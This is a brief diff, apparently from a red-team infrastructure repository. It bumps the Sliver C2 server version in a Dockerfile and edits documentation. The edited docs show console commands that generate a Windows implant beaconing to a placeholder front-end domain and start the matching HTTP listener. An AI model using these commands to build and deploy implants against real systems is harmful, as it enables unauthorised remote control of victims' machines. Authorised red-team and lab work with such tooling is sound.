@@ -18,7 +18,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     ca-certificates curl mingw-w64 && \
     rm -rf /var/lib/apt/lists/*
 
-ARG SLIVER_VERSION=v1.5.42
+ARG SLIVER_VERSION=v1.7.3
 RUN curl -fsSL https://github.com/BishopFox/sliver/releases/download/${SLIVER_VERSION}/sliver-server_linux \
         -o /usr/local/bin/sliver-server && \
     chmod +x /usr/local/bin/sliver-server
@@ -58,7 +58,7 @@ $ sliver
 Inside the Sliver console:
 
 ```text
-sliver > generate --http https://<frontend-domain> --os windows --arch amd64 --save /tmp/imp.exe
+sliver > generate --http <frontend-domain> --os windows --arch amd64 --save /tmp/imp.exe
 sliver > http --domain <frontend-domain> --lport 8888
 ```
 
